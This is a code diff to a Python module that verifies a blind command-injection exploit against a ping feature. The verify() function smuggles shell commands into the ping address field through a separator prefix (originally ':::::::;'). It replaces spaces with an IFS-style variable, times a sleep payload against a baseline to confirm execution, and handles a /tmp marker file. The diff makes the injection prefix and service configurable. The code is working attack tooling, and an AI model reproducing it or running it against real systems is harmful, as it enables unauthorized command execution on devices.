@@ -5,7 +5,7 @@ from __future__ import annotations
 import random
 import string
 
-from .inject import I, run_ping
+from .inject import run_ping
 
 TIMING_THRESHOLD = 3.0
 
@@ -13,16 +13,24 @@ TIMING_THRESHOLD = 3.0
 def verify(inj, sleep_seconds: int = 10, log=print) -> dict:
     """Timing probe + /tmp marker lifecycle. Nothing persistent is changed."""
     client = inj.client
-    base1, _ = run_ping(client, "127.0.0.1")
-    base2, _ = run_ping(client, "127.0.0.1")
+    prefix = inj.payload_prefix
+    I = inj.I
+    base1, _ = run_ping(client, "127.0.0.1",
+                        service=inj.injection_service,
+                        reader=inj.injection_reader)
+    base2, _ = run_ping(client, "127.0.0.1",
+                        service=inj.injection_service,
+                        reader=inj.injection_reader)
     baseline = max(base1, base2)
     log(f"[verify] baseline {baseline:.1f}s")
 
-    marker = "/tmp/nx_b_" + "".join(random.choices(string.ascii_lowercase + string.digits, k=10))
+    marker = "/tmp/hgt_b_" + "".join(random.choices(string.ascii_lowercase + string.digits, k=10))
     report = {"marker": marker, "baseline_s": round(baseline, 2)}
 
     def timed(cmd: str) -> float:
-        elapsed, _ = run_ping(client, ":::::::;" + cmd)
+        elapsed, _ = run_ping(client, prefix + cmd,
+                              service=inj.injection_service,
+                              reader=inj.injection_reader)
         return elapsed
 
     t_sleep = timed(f"sleep{I}{sleep_seconds}")
